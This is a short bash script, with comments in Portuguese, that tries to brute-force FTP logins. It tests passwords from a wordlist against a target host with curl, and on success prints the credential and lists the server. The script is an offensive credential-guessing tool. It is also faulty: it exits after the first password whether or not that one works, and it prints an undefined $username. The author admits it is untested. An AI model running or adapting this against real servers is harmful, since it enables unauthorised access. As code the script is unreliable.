#!/usr/bin/env bash
#Script que faz bruteforce em servidores FTP e se houver resposta positiva mostra na saida do script
#Eu irei ligar um server ftp só para testar a veracidade desse script, pois não dá para ter certeza!
#Ainda nao posso ter certeza da integridade desse script (se funciona ou não, pois teve apenas mensagem de erro (brute force é foda))
#dia 25 de maio ás 23:17



while read senhas;do
  value="$(curl -s -o /dev/null -w "%{http_code}" -u $1:$senhas ftp://$2:21)"
if [ "$value" == "226" ];then
  echo "Encontrado credencial: username: $username password: $senhas"
  curl -s -u $1:$senhas ftp://$2:21
  exit
else
  echo "Nenhuma credencial com sucesso"
  exit
fi
done < senhasftp.txt
